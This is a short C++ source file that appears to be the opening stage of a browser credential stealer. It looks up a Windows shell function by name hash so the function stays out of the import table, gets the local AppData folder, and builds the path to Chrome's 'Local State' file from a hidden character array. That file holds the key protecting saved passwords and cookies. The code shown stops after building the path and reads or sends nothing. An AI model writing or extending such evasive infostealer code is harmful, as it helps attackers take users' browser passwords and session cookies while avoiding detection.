#include "ApiResolve.h"
#include "Base64.h"
#include "CRT.h"
#include "HashString.h"

int main() {
    ApiResolve apiResolve;
    typedef HRESULT(WINAPI* _SHGetFolderPathA)(
        HWND   hwnd,
        int    csidl,
        HANDLE hToken,
        DWORD  dwFlags,
        LPSTR  pszPath
        );
    HMODULE hShell32 = LoadLibraryA("Shell32.dll");
    constexpr unsigned int hashSHGetFolderPathA = ComplexHashForAnsi("SHGetFolderPathA");
    _SHGetFolderPathA pSHGetFolderPathA = (_SHGetFolderPathA)apiResolve.GetApiAddress(hShell32, hashSHGetFolderPathA);
    if (!pSHGetFolderPathA) { return 0; }
    char path[MAX_PATH] = { 0 };
//#include <Shlobj.h>
    if (pSHGetFolderPathA(NULL, 0x001c, NULL, 0, path) != S_OK) {
        return 0;
    }

    char sLocalState[] = { '\\', 'G', 'o', 'o', 'g', 'l', 'e', '\\', 'C', 'h', 'r', 'o', 'm', 'e', '\\', 'U', 's', 'e', 'r', ' ', 'D', 'a', 't', 'a', '\\', 'L', 'o', 'c', 'a', 'l', ' ', 'S', 't', 'a', 't', 'e', '\0' };
    int size = StrLen(path);
    CopyStringA(sLocalState, path + StrLen(path), MAX_PATH - StrLen(sLocalState));

    return 0;
}